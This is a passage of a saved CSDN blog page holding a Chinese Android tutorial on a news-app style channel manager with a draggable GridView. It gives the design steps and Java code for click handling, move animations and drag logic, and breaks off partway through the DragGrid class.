@@ -1,0 +1,1671 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+     
+    <html xmlns="http://www.w3.org/1999/xhtml">
+    
+<head>  
+
+    <script type="text/javascript" src="http://c.csdnimg.cn/pubfooter/js/tracking.js" charset="utf-8"></script>  
+
+    <script type="text/javascript">
+        var protocol = window.location.protocol;
+        document.write('<script type="text/javascript" src="' + protocol + '//csdnimg.cn/pubfooter/js/repoAddr2.js?v=' + Math.random() + '"></' + 'script>');
+    </script>
+
+  
+ <meta http-equiv="Cache-Control" content="no-siteapp" /><link rel="alternate" media="handheld" href="#" />
+
+    <title>Android 高仿 频道管理----网易、今日头条、腾讯视频  （可以拖动的GridView）附源码DEMO - 未来之路 的专栏
+        - 博客频道 - CSDN.NET</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="description" content="距离上次发布（android高仿系列）今日头条 --新闻阅读器 （二）相关的内容已经半个月了，最近利用空闲时间，把今日头条客户端完善了下。完善的功能一个一个全部实现后，就放整个源码。开发的进度就是按照一个一个功能的思路走的，所以开发一个小的功能，如果有用，就写一个专门的博客以便有人用到独立的功能可以方便使用。这次实现的功能是很多新闻阅读器（网易，今日头条，360新闻等）以及腾讯视频等里" />
+    <script src="http://static.blog.csdn.net/scripts/jquery.js" type="text/javascript"></script>
+      <script type="text/javascript" src="http://static.blog.csdn.net/scripts/jquery-version.js"></script>
+    <script type="text/javascript" src="http://static.blog.csdn.net/scripts/ad.js?v=1.1"></script>
+        <!--new top-->
+               <link rel="stylesheet" href="http://c.csdnimg.cn/public/common/toolbar/css/index.css">        <!--new top-->
+    
+      <!-- ad begin -->
+         <script language="javascript" type="text/javascript" src="http://ads.csdn.net/js/tracking.js"></script>
+    <!-- ad end-->
+
+    <link rel="Stylesheet" type="text/css" href="http://static.blog.csdn.net/skin/light_blue/css/style.css?v=1.1" />
+    <link id="RSSLink" title="RSS" type="application/rss+xml" rel="alternate" href="/vipzjyno1/rss/list" />
+    <link rel="shortcut icon" href="http://c.csdnimg.cn/public/favicon.ico" />
+    <link type="text/css" rel="stylesheet" href="http://static.blog.csdn.net/scripts/SyntaxHighlighter/styles/default.css" />
+ 
+
+
+</head>
+<body>
+
+
+    <!-- 广告位开始 -->
+        <ins data-revive-zoneid="149" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins>
+    <!-- 广告位结束 -->
+
+    
+   
+      <!--new top-->
+    <script id="toolbar-tpl-scriptId" fixed="true" prod="blog" skin="black" src="http://c.csdnimg.cn/public/common/toolbar/js/html.js" type="text/javascript"></script>
+     <!--new top-->
+    <div id="container">
+        <div id="header">
+    <div class="header">
+        <div id="blog_title">
+            <h2>
+                <a href="http://blog.csdn.net/vipzjyno1">未来之路 的专栏</a></h2>
+            <h3>只要你做的够好, 终有一天, 你会发现你得到的远比失去的要多.</h3>
+            <div class="clear">
+            </div>
+        </div>
+        <div class="clear">
+        </div>
+        
+     
+    </div>
+</div>
+<div id="navigator">
+    <div class="navigator_bg">
+    </div>
+    <div class="navigator">
+        <ul>           
+                <li id="btnContents"><a href="http://blog.csdn.net/vipzjyno1?viewmode=contents"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_mulu'])">
+                    <img src="http://static.blog.csdn.net/images/ico_list.gif">目录视图</span></a></li>
+                <li id="btnView"><a href="http://blog.csdn.net/vipzjyno1?viewmode=list"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_zhaiyao'])">
+                    <img src="http://static.blog.csdn.net/images/ico_summary.gif">摘要视图</span></a></li>
+                <li id="btnRss"><a href="http://blog.csdn.net/vipzjyno1/rss/list"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_RSS'])">
+                    <img src="http://static.blog.csdn.net/images/ico_rss.gif">订阅</span></a></li>                
+            
+
+            </ul>
+    </div>
+</div>
+<script type="text/javascript">
+    var username = "vipzjyno1";
+    var _blogger = username;
+    var blog_address = "http://blog.csdn.net/vipzjyno1";
+    var static_host = "http://static.blog.csdn.net";
+    var currentUserName = "";  
+</script>
+
+        <div id="body">
+            <div id="main">
+                <div class="main">
+                        <div class="ad_class">
+<div class="notice tracking-ad" data-mod='popu_3' > 
+
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/65629853">
+<font color=blue>【CSDN 日报】| 2.17-3.17 上榜作者排行出炉 </font></a>
+
+&nbsp;&nbsp;&nbsp;&nbsp
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/60961185">
+<font color=red>同步博客至 CSDN ，让更多开发者看到你的文章
+</font></a>
+&nbsp;&nbsp;&nbsp;&nbsp
+
+<a href="http://edu.csdn.net/huiyiCourse/series_detail/29?ref=blog&loc=r0">
+<font color=blue>看微博技术大咖解析互联网应用架构实战
+</font></a>
+</div>                        </div>
+                        
+
+
+
+  
+<link href="http://static.blog.csdn.net/css/comment1.css" type="text/css" rel="stylesheet" />
+<link href="http://static.blog.csdn.net/css/style1.css" type="text/css" rel="stylesheet" />
+<script language='JavaScript' type='text/javascript' src='http://download.csdn.net/js/jquery.cookie.js'></script>
+<script type="text/javascript" src="http://c.csdnimg.cn/rabbit/search-service/main.js"></script>
+<link rel="stylesheet" href="http://static.blog.csdn.net/public/res-min/markdown_views.css?v=1.0" />
+<link rel="stylesheet" href="http://static.blog.csdn.net/css/category.css?v=1.0" />
+<script type="text/javascript" src="http://static.blog.csdn.net/public/res/bower-libs/MathJax/MathJax.js?config=TeX-AMS_HTML"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/web-storage-cache.min.js"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/replace.min.js"></script>
+
+
+
+
+  <script type="text/ecmascript">
+      window.quickReplyflag = true;
+           
+            var isBole = false;
+            
+      
+      var fasrc="http://my.csdn.net/my/favorite/miniadd?t=Android+%e9%ab%98%e4%bb%bf+%e9%a2%91%e9%81%93%e7%ae%a1%e7%90%86----%e7%bd%91%e6%98%93%e3%80%81%e4%bb%8a%e6%97%a5%e5%a4%b4%e6%9d%a1%e3%80%81%e8%85%be%e8%ae%af%e8%a7%86%e9%a2%91++%ef%bc%88%e5%8f%af%e4%bb%a5%e6%8b%96%e5%8a%a8%e7%9a%84GridView%ef%bc%89%e9%99%84%e6%ba%90%e7%a0%81DEMO&u=http://blog.csdn.net/vipzjyno1/article/details/25005851"
+
+    </script>
+<div id="article_details" class="details">
+    <div class="article_title">   
+         <span class="ico ico_type_Original"></span>
+
+
+    <h1>
+        <span class="link_title"><a href="/vipzjyno1/article/details/25005851">
+        <font color="red">[置顶]</font>
+        Android 高仿 频道管理----网易、今日头条、腾讯视频  （可以拖动的GridView）附源码DEMO            
+        </a></span>
+    </h1>
+</div>
+
+   
+
+        <div class="article_manage clearfix">
+        <div class="article_l">
+            <span class="link_categories">
+            标签：
+              <a href='http://www.csdn.net/tag/%e9%a2%91%e9%81%93%e7%ae%a1%e7%90%86' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">频道管理</a><a href='http://www.csdn.net/tag/%e4%bb%8a%e6%97%a5%e5%a4%b4%e6%9d%a1' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">今日头条</a><a href='http://www.csdn.net/tag/%e7%bd%91%e6%98%93' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">网易</a><a href='http://www.csdn.net/tag/GridView' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">GridView</a><a href='http://www.csdn.net/tag/%e6%8b%96%e6%8b%bd' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">拖拽</a>
+            </span>
+        </div>
+        <div class="article_r">
+            <span class="link_postdate">2014-05-05 08:42</span>
+            <span class="link_view" title="阅读次数">35929人阅读</span>
+            <span class="link_comments" title="评论次数"> <a href="#comments" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_pinglun'])">评论</a>(59)</span>
+            <span class="link_collect tracking-ad" data-mod="popu_171"> <a href="javascript:void(0);" onclick="javascript:collectArticle('Android+%e9%ab%98%e4%bb%bf+%e9%a2%91%e9%81%93%e7%ae%a1%e7%90%86----%e7%bd%91%e6%98%93%e3%80%81%e4%bb%8a%e6%97%a5%e5%a4%b4%e6%9d%a1%e3%80%81%e8%85%be%e8%ae%af%e8%a7%86%e9%a2%91++%ef%bc%88%e5%8f%af%e4%bb%a5%e6%8b%96%e5%8a%a8%e7%9a%84GridView%ef%bc%89%e9%99%84%e6%ba%90%e7%a0%81DEMO','25005851');return false;" title="收藏">收藏</a></span>
+             <span class="link_report"> <a href="#report" onclick="javascript:report(25005851,2);return false;" title="举报">举报</a></span>
+
+        </div>
+    </div>
+    <div class="embody"  style="display:none" id="embody">
+        <span class="embody_t">本文章已收录于：</span>
+        <div class="embody_c" id="lib" value="{&quot;err&quot;:0,&quot;msg&quot;:&quot;ok&quot;,&quot;data&quot;:[]}"></div>
+    </div>
+    <style type="text/css">        
+            .embody{
+                padding:10px 10px 10px;
+                margin:0 -20px;
+                border-bottom:solid 1px #ededed;                
+            }
+            .embody_b{
+                margin:0 ;
+                padding:10px 0;
+            }
+            .embody .embody_t,.embody .embody_c{
+                display: inline-block;
+                margin-right:10px;
+            }
+            .embody_t{
+                font-size: 12px;
+                color:#999;
+            }
+            .embody_c{
+                font-size: 12px;
+            }
+            .embody_c img,.embody_c em{
+                display: inline-block;
+                vertical-align: middle;               
+            }
+             .embody_c img{               
+                width:30px;
+                height:30px;
+            }
+            .embody_c em{
+                margin: 0 20px 0 10px;
+                color:#333;
+                font-style: normal;
+            }
+    </style>
+    <script  type="text/javascript">
+        $(function () {
+            try
+            {
+                var lib = eval("("+$("#lib").attr("value")+")");
+                var html = "";
+                if (lib.err == 0) {
+                    $.each(lib.data, function (i) {
+                        var obj = lib.data[i];
+                        //html += '<img src="' + obj.logo + '"/>' + obj.name + "&nbsp;&nbsp;";
+                        html += ' <a href="' + obj.url + '" target="_blank">';
+                        html += ' <img src="' + obj.logo + '">';
+                        html += ' <em><b>' + obj.name + '</b></em>';
+                        html += ' </a>';
+                    });
+                    if (html != "") {
+                        setTimeout(function () {
+                            $("#lib").html(html);                      
+                            $("#embody").show();
+                        }, 100);
+                    }
+                }      
+            } catch (err)
+            { }
+            
+        });
+    </script>
+      <div class="category clearfix">
+        <div class="category_l">
+           <img src="http://static.blog.csdn.net/images/category_icon.jpg">
+            <span>分类：</span>
+        </div>
+        <div class="category_r">
+                    <label  onclick="GetCategoryArticles('2050837','vipzjyno1','top','25005851');">
+                        <span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_fenlei']);">android<em>（19）</em></span>
+                      <img class="arrow-down" src="http://static.blog.csdn.net/images/arrow_triangle _down.jpg" style="display:inline;">
+                      <img class="arrow-up" src="http://static.blog.csdn.net/images/arrow_triangle_up.jpg" style="display:none;">
+                        <div class="subItem">
+                            <div class="subItem_t"><a  href="http://blog.csdn.net/vipzjyno1/article/category/2050837"  target="_blank">作者同类文章</a><i class="J_close">X</i></div>
+                            <ul class="subItem_l" id="top_2050837">                            
+                            </ul>
+                        </div>
+                    </label>                    
+        </div>
+    </div>
+    <script   type="text/javascript" src="http://static.blog.csdn.net/scripts/category.js"></script>  
+        <div   class="bog_copyright">         
+            <p  class="copyright_p" >版权声明：本文为博主原创文章，未经博主允许不得转载。</p>
+        </div>
+
+  
+
+  
+  
+     
+
+<div id="article_content" class="article_content">
+
+<p><span style="font-size:18px">距离上次发布<a target="_blank" target="_blank" href="http://blog.csdn.net/vipzjyno1/article/details/23619269" style="text-decoration:none; font-family:'Microsoft YaHei'; line-height:30px"><span style="color:#cc0000">（android高仿系列）今日头条
+ --新闻阅读器 （二）</span></a></span></p>
+<p><span style="font-size:18px">相关的内容已经半个月了，最近利用空闲时间，把今日头条客户端完善了下。完善的功能一个一个全部实现后，就放整个源码。开发的进度就是按照一个一个功能的思路走的，所以开发一个小的功能，如果有用，就写一个专门的博客以便有人用到独立的功能可以方便使用。</span></p>
+<p><span style="font-size:18px">这次实现的功能是很多新闻阅读器（网易，今日头条，360新闻等）以及腾讯视频等里面都会出现的频道管理功能。</span></p>
+<p><span style="font-size:18px"><br>
+</span></p>
+<p><span style="font-size:18px">下面先上这次实现功能的效果图：(<span style="color:#ff0000">注：这个效果图没有拖拽的时候移动动画，DEMO里面有，可以下载看看</span>)</span></p>
+<p><span style="font-size:18px"><img src="http://img.my.csdn.net/uploads/201405/05/1399250647_1821.gif" width="240" height="400" alt=""><br>
+</span></p>
+<h1><span style="font-size:24px"><br>
+</span></h1>
+<h1><span style="font-size:24px">一、开发心里历程</span></h1>
+<p><span style="font-size:18px">刚开始接触这个的时候，不知道要如何实现，去网上翻了一大堆资料，懂了个大概，就是目前可以找到的都是拖拽的时候，不带移动动画的，和线上的客户端交互效果相差甚远，在反反复复的尝试查看相关东西，大致的做了出来，目前在模拟器上&#20284;乎有一点小BUG，真机测试没有问题，就先放上来，如果发现问题在修改优化。代码反面，没有好好的修改调整，可能会有点乱，请见谅哈。</span></p>
+<p><span style="font-size:18px"><br>
+</span></p>
+<h1><span style="font-size:24px">二、开发前的准备</span></h1>
+<p><span style="font-size:18px">1.了解重写View的相关知识，并且知道GridView的一些内部方法，如：怎么通过触摸的坐标获取对应的position等（这里我采用的是继承GridView控件）</span></p>
+<p><span style="font-size:18px">2.了解屏幕触摸动作传递原理 &nbsp; &nbsp;这里我以前转载的一篇或许会有帮助：<a target="_blank" target="_blank" href="http://blog.csdn.net/vipzjyno1/article/details/21746311" style="color:rgb(51,51,51); text-decoration:none; font-family:'Microsoft YaHei'; line-height:30px">Android事件分发机制完全解析，带你从源码的角度彻底理解(全)</a><br>
+</span></p>
+<p><span style="font-size:18px">3.了解位移动画Animation，本DEMO中主要用到：TranslateAnimation &nbsp;平移动画</span></p>
+<p><span style="font-size:18px">4.了解WindowManager的<span style="font-family:Helvetica,Tahoma,Arial,sans-serif; line-height:25.1875px">窗口机制，这里的item拖拽等都要设计到这个。</span></span></p>
+<p><span style="font-size:18px">5.了解SQLiteDatabase 以及SQLiteOpenHelper等数据库操作相关的类，本DEMO中主要用到数据库进行存储频道信息，如果你要用文档进行存储读取也可以。</span></p>
+<p><span style="font-size:18px"><br>
+</span></p>
+<h1><span style="font-size:24px"><strong>三、开发思路</strong></span></h1>
+<p><span style="font-family:SimSun; font-size:18px">1. &nbsp;获取数据库中频道的列表，如果为空，赋予默认列表，并存入数据库，之后通过对应的适配器赋给对应的GridView</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><br>
+</span></p>
+<p><span style="font-family:SimSun; font-size:18px">2. &nbsp;2个GridView--（1.DragGrid &nbsp; 2. OtherGridView）</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><span style="white-space:pre"></span>DragGrid 用于显示我的频道，带有长按拖拽效果</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><span style="white-space:pre"></span>OtherGridView用于显示更多频道，不带推拽效果</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><span style="white-space:pre"></span>注：由于屏幕大小不一定，外层使用ScrollView，所以2者都要重写计算高度</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><br>
+</span></p>
+<p><span style="font-family:SimSun; font-size:18px">3. &nbsp;点击2个GridView的时候，根据点击的Item对应的position，获取position对应的view，进行创建一层移动的动画层</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><span style="color:#ff0000">起始位置</span>：点击的positiongetLocationInWindow（）获取。<span style="color:#ff0000">终点位置</span>：另一个GridView的最后个ITEM 的position&nbsp;&#43; 1的位置。</span></p>
+<p><span style="font-family:SimSun; font-size:18px">并赋予移动动画，等动画结束后对2者对应的频道列表进行数据的remove和add操作。</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><br>
+</span></p>
+<p><span style="font-family:SimSun; font-size:18px">4. &nbsp;设置点击和拖动的限制条件，如 &nbsp;推荐 &nbsp;这个ITEM是不允许用户操作的。</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><br>
+</span></p>
+<p><span style="font-family:SimSun; font-size:18px">5. &nbsp;拖动的DragGrid的操作：</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><span style="white-space:pre"></span>（1）长按获取长按的ITEM的position &nbsp;-- dragPosition&nbsp;以及对应的view ，手指触摸屏幕的时候，调用onInterceptTouchEvent来获取MotionEvent.ACTION_DOWN事件，获取对应的数据。由于这里是继承了GridView，所以长按时间可以通过setOnItemLongClickListener监听来执行，或则你也可以通过计算点击时间来监听是否长按。</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><span style="white-space:pre"></span>（2）通过onTouchEvent(MotionEvent ev)来监听手指的移动和抬起动作。当它移动到 其它的item下面，并且下方的item对应的position &nbsp;不等于&nbsp;dragPosition，进行数据交换，并且2者之间的所有item进行移动动画，动画结束后，数据更替刷新界面。</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><span style="white-space:pre"></span>（3）&nbsp;抬起手后，清除掉拖动时候创建的view，让GridView中的数据显示。</span></p>
+<p><span style="font-family:SimSun; font-size:18px"><br>
+</span></p>
+<p><span style="font-family:SimSun; font-size:18px">6. &nbsp;退出时候，将改变后的频道列表存入数据库。</span></p>
+<p><span style="font-size:18px"><span style="font-size:18px"><br>
+</span></span></p>
+<h1><span style="font-size:24px">四、流程图</span></h1>
+<p><span style="font-size:18px">下面是大体的流程图：</span></p>
+<p style="text-align:center"><img src="http://img.blog.csdn.net/20140504235519968?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdmlwemp5bm8x/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>
+</p>
+<p><br>
+</p>
+<h1><span style="font-size:24px"><br>
+</span></h1>
+<h1><span style="font-size:24px">五、核心代码</span></h1>
+<div><span style="color:rgb(255,0,0)"><span style="font-family:Microsoft YaHei; font-size:24px">点击进行添加删除：</span></span></div>
+<div><pre code_snippet_id="327055" snippet_file_name="blog_20140505_1_4488625" name="code" class="java">/** GRIDVIEW对应的ITEM点击监听接口  */
+	@Override
+	public void onItemClick(AdapterView&lt;?&gt; parent, final View view, final int position,long id) {
+		//如果点击的时候，之前动画还没结束，那么就让点击事件无效
+		if(isMove){
+			return;
+		}
+		switch (parent.getId()) {
+		case R.id.userGridView:
+			//position为 0，1 的不可以进行任何操作
+			if (position != 0 &amp;&amp; position != 1) {
+				final ImageView moveImageView = getView(view);
+				if (moveImageView != null) {
+					TextView newTextView = (TextView) view.findViewById(R.id.text_item);
+					final int[] startLocation = new int[2];
+					newTextView.getLocationInWindow(startLocation);
+					final ChannelItem channel = ((DragAdapter) parent.getAdapter()).getItem(position);//获取点击的频道内容
+					otherAdapter.setVisible(false);
+					//添加到最后一个
+					otherAdapter.addItem(channel);
+					new Handler().postDelayed(new Runnable() {
+						public void run() {
+							try {
+								int[] endLocation = new int[2];
+								//获取终点的坐标
+								otherGridView.getChildAt(otherGridView.getLastVisiblePosition()).getLocationInWindow(endLocation);
+								MoveAnim(moveImageView, startLocation , endLocation, channel,userGridView);
+								userAdapter.setRemove(position);
+							} catch (Exception localException) {
+							}
+						}
+					}, 50L);
+				}
+			}
+			break;
+		case R.id.otherGridView:
+			final ImageView moveImageView = getView(view);
+			if (moveImageView != null){
+				TextView newTextView = (TextView) view.findViewById(R.id.text_item);
+				final int[] startLocation = new int[2];
+				newTextView.getLocationInWindow(startLocation);
+				final ChannelItem channel = ((OtherAdapter) parent.getAdapter()).getItem(position);
+				userAdapter.setVisible(false);
+				//添加到最后一个
+				userAdapter.addItem(channel);
+				new Handler().postDelayed(new Runnable() {
+					public void run() {
+						try {
+							int[] endLocation = new int[2];
+							//获取终点的坐标
+							userGridView.getChildAt(userGridView.getLastVisiblePosition()).getLocationInWindow(endLocation);
+							MoveAnim(moveImageView, startLocation , endLocation, channel,otherGridView);
+							otherAdapter.setRemove(position);
+						} catch (Exception localException) {
+						}
+					}
+				}, 50L);
+			}
+			break;
+		default:
+			break;
+		}
+	}</pre></div>
+<div>
+<div><br>
+</div>
+<div><br>
+</div>
+<span style="color:rgb(255,0,0)"><span style="font-family:Microsoft YaHei; font-size:24px">移动动画：</span></span></div>
+<div><pre code_snippet_id="327055" snippet_file_name="blog_20140505_2_5786571" name="code" class="java"><span style="font-size:14px;">private void MoveAnim(View moveView, int[] startLocation,int[] endLocation, final ChannelItem moveChannel,
+			final GridView clickGridView) {
+		int[] initLocation = new int[2];
+		//获取传递过来的VIEW的坐标
+		moveView.getLocationInWindow(initLocation);
+		//得到要移动的VIEW,并放入对应的容器中
+		final ViewGroup moveViewGroup = getMoveViewGroup();
+		final View mMoveView = getMoveView(moveViewGroup, moveView, initLocation);
+		//创建移动动画
+		TranslateAnimation moveAnimation = new TranslateAnimation(
+				startLocation[0], endLocation[0], startLocation[1],
+				endLocation[1]);
+		moveAnimation.setDuration(300L);//动画时间
+		//动画配置
+		AnimationSet moveAnimationSet = new AnimationSet(true);
+		moveAnimationSet.setFillAfter(false);//动画效果执行完毕后，View对象不保留在终止的位置
+		moveAnimationSet.addAnimation(moveAnimation);
+		mMoveView.startAnimation(moveAnimationSet);
+		moveAnimationSet.setAnimationListener(new AnimationListener() {
+			
+			@Override
+			public void onAnimationStart(Animation animation) {
+				isMove = true;
+			}
+			
+			@Override
+			public void onAnimationRepeat(Animation animation) {
+			}
+			
+			@Override
+			public void onAnimationEnd(Animation animation) {
+				moveViewGroup.removeView(mMoveView);
+				// instanceof 方法判断2边实例是不是一样，判断点击的是DragGrid还是OtherGridView
+				if (clickGridView instanceof DragGrid) {
+					otherAdapter.setVisible(true);
+					otherAdapter.notifyDataSetChanged();
+					userAdapter.remove();
+				}else{
+					userAdapter.setVisible(true);
+					userAdapter.notifyDataSetChanged();
+					otherAdapter.remove();
+				}
+				isMove = false;
+			}
+		});
+	}</span></pre><br>
+<span style="color:rgb(255,0,0)"><span style="font-family:Microsoft YaHei; font-size:24px">可拖拽的DragGrid代码：</span><span style="font-size:18px">&nbsp;</span></span><br>
+<pre code_snippet_id="327055" snippet_file_name="blog_20140505_3_6975833" name="code" class="java">public class DragGrid extends GridView {
+	/** 点击时候的X位置 */
+	public int downX;
+	/** 点击时候的Y位置 */
+	public int downY;
+	/** 点击时候对应整个界面的X位置 */
+	public int windowX;
+	/** 点击时候对应整个界面的Y位置 */
+	public int windowY;
+	/** 屏幕上的X */
+	private int win_view_x;
+	/** 屏幕上的Y */
+	private int win_view_y;
+	/** 拖动的里x的距离 */
+	int dragOffsetX;
+	/** 拖动的里Y的距离 */
+	int dragOffsetY;
+	/** 长按时候对应postion */
+	public int dragPosition;
+	/** Up后对应的ITEM的Position */
+	private int dropPosition;
+	/** 开始拖动的ITEM的Position */
+	private int startPosition;
+	/** item高 */
+	private int itemHeight;
+	/** item宽 */
+	private int itemWidth;
+	/** 拖动的时候对应ITEM的VIEW */
+	private View dragImageView = null;
+	/** 长按的时候ITEM的VIEW */
+	private ViewGroup dragItemView = null;
+	/** WindowManager管理器 */
+	private WindowManager windowManager = null;
+	/** */
+	private WindowManager.LayoutParams windowParams = null;
+	/** item总量 */
+	private int itemTotalCount;
+	/** 一行的ITEM数量 */
+	private int nColumns = 4;
+	/** 行数 */
+	private int nRows;
+	/** 剩余部分 */
+	private int Remainder;
+	/** 是否在移动 */
+	private boolean isMoving = false;
+	/** */
+	private int holdPosition;
+	/** 拖动的时候放大的倍数 */
+	private double dragScale = 1.2D;
+	/** 震动器 */
+	private Vibrator mVibrator;
+	/** 每个ITEM之间的水平间距 */
+	private int mHorizontalSpacing = 15;
+	/** 每个ITEM之间的竖直间距 */
+	private int mVerticalSpacing = 15;
+	/* 移动时候最后个动画的ID */
+	private String LastAnimationID;
+
+	public DragGrid(Context context) {
+		super(context);
+		init(context);
+	}
+
+	public DragGrid(Context context, AttributeSet attrs, int defStyle) {
+		super(context, attrs, defStyle);
+		init(context);
+	}
+
+	public DragGrid(Context context, AttributeSet attrs) {
+		super(context, attrs);
+		init(context);
+	}
+
+	public void init(Context context) {
+		mVibrator = (Vibrator) context
+				.getSystemService(Context.VIBRATOR_SERVICE);
+		// 将布局文件中设置的间距dip转为px
+		mHorizontalSpacing = DataTools.dip2px(context, mHorizontalSpacing);
+	}
+
+	@Override
+	public boolean onInterceptTouchEvent(MotionEvent ev) {
+		// TODO Auto-generated method stub
+		if (ev.getAction() == MotionEvent.ACTION_DOWN) {
+			downX = (int) ev.getX();
+			downY = (int) ev.getY();
+			windowX = (int) ev.getX();
+			windowY = (int) ev.getY();
+			setOnItemClickListener(ev);
+		}
+		return super.onInterceptTouchEvent(ev);
+	}
+
+	@Override
+	public boolean onTouchEvent(MotionEvent ev) {
+		// TODO Auto-generated method stub
+		boolean bool = true;
+		if (dragImageView != null
+				&amp;&amp; dragPosition != AdapterView.INVALID_POSITION) {
+			// 移动时候的对应x,y位置
+			bool = super.onTouchEvent(ev);
+			int x = (int) ev.getX();
+			int y = (int) ev.getY();
+			switch (ev.getAction()) {
+			case MotionEvent.ACTION_DOWN:
+				downX = (int) ev.getX();
+				windowX = (int) ev.getX();
+				downY = (int) ev.getY();
+				windowY = (int) ev.getY();
+				break;
+			case MotionEvent.ACTION_MOVE:
+				onDrag(x, y, (int) ev.getRawX(), (int) ev.getRawY());
+				if (!isMoving) {
+					OnMove(x, y);
+				}
+				if (pointToPosition(x, y) != AdapterView.INVALID_POSITION) {
+					break;
+				}
+				break;
+			case MotionEvent.ACTION_UP:
+				stopDrag();
+				onDrop(x, y);
+				requestDisallowInterceptTouchEvent(false);
+				break;
+
+			default:
+				break;
+			}
+		}
+		return super.onTouchEvent(ev);
+	}
+
+	/** 在拖动的情况 */
+	private void onDrag(int x, int y, int rawx, int rawy) {
+		if (dragImageView != null) {
+			windowParams.alpha = 0.6f;
+			windowParams.x = rawx - win_view_x;
+			windowParams.y = rawy - win_view_y;
+			windowManager.updateViewLayout(dragImageView, windowParams);
+		}
+	}
+
+	/** 在松手下放的情况 */
+	private void onDrop(int x, int y) {
+		// 根据拖动到的x,y坐标获取拖动位置下方的ITEM对应的POSTION
+		int tempPostion = pointToPosition(x, y);
+		dropPosition = tempPostion;
+		DragAdapter mDragAdapter = (DragAdapter) getAdapter();
+		// 显示刚拖动的ITEM
+		mDragAdapter.setShowDropItem(true);
+		// 刷新适配器，让对应的ITEM显示
+		mDragAdapter.notifyDataSetChanged();
+	}
+
+	/**
+	 * 长按点击监听
+	 * @param ev
+	 */
+	public void setOnItemClickListener(final MotionEvent ev) {
+		setOnItemLongClickListener(new OnItemLongClickListener() {
+
+			@Override
+			public boolean onItemLongClick(AdapterView&lt;?&gt; parent, View view,
+					int position, long id) {
+				int x = (int) ev.getX();// 长安事件的X位置
+				int y = (int) ev.getY();// 长安事件的y位置
+				startPosition = position;// 第一次点击的postion
+				dragPosition = position;
+				if (startPosition &lt;= 1) {
+					return false;
+				}
+				ViewGroup dragViewGroup = (ViewGroup) getChildAt(dragPosition
+						- getFirstVisiblePosition());
+				TextView dragTextView = (TextView) dragViewGroup
+						.findViewById(R.id.text_item);
+				dragTextView.setSelected(true);
+				dragTextView.setEnabled(false);
+				itemHeight = dragViewGroup.getHeight();
+				itemWidth = dragViewGroup.getWidth();
+				itemTotalCount = DragGrid.this.getCount();
+				int row = itemTotalCount / nColumns;// 算出行数
+				Remainder = (itemTotalCount % nColumns);// 算出最后一行多余的数量
+				if (Remainder != 0) {
+					nRows = row + 1;
+				} else {
+					nRows = row;
+				}
+				// 如果特殊的这个不等于拖动的那个,并且不等于-1
+				if (dragPosition != AdapterView.INVALID_POSITION) {
+					// 释放的资源使用的绘图缓存。如果你调用buildDrawingCache()手动没有调用setDrawingCacheEnabled(真正的),你应该清理缓存使用这种方法。
+					win_view_x = windowX - dragViewGroup.getLeft();// VIEW相对自己的X，半斤
+					win_view_y = windowY - dragViewGroup.getTop();// VIEW相对自己的y，半斤
+					dragOffsetX = (int) (ev.getRawX() - x);// 手指在屏幕的上X位置-手指在控件中的位置就是距离最左边的距离
+					dragOffsetY = (int) (ev.getRawY() - y);// 手指在屏幕的上y位置-手指在控件中的位置就是距离最上边的距离
+					dragItemView = dragViewGroup;
+					dragViewGroup.destroyDrawingCache();
+					dragViewGroup.setDrawingCacheEnabled(true);
+					Bitmap dragBitmap = Bitmap.createBitmap(dragViewGroup
+							.getDrawingCache());
+					mVibrator.vibrate(50);// 设置震动时间
+					startDrag(dragBitmap, (int) ev.getRawX(),
+							(int) ev.getRawY());
+					hideDropItem();
+					dragViewGroup.setVisibility(View.INVISIBLE);
+					isMoving = false;
+					requestDisallowInterceptTouchEvent(true);
+					return true;
+				}
+				return false;
+			}
+		});
+	}
+
+	public void startDrag(Bitmap dragBitmap, int x, int y) {
+		stopDrag();
+		windowParams = new WindowManager.LayoutParams();// 获取WINDOW界面的
+		// Gravity.TOP|Gravity.LEFT;这个必须加
+		windowParams.gravity = Gravity.TOP | Gravity.LEFT;
+		// 得到preview左上角相对于屏幕的坐标
+		windowParams.x = x - win_view_x;
+		windowParams.y = y - win_view_y;
+		// 设置拖拽item的宽和高
+		windowParams.width = (int) (dragScale * dragBitmap.getWidth());// 放大dragScale倍，可以设置拖动后的倍数
+		windowParams.height = (int) (dragScale * dragBitmap.getHeight());// 放大dragScale倍，可以设置拖动后的倍数
+		this.windowParams.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+				| WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
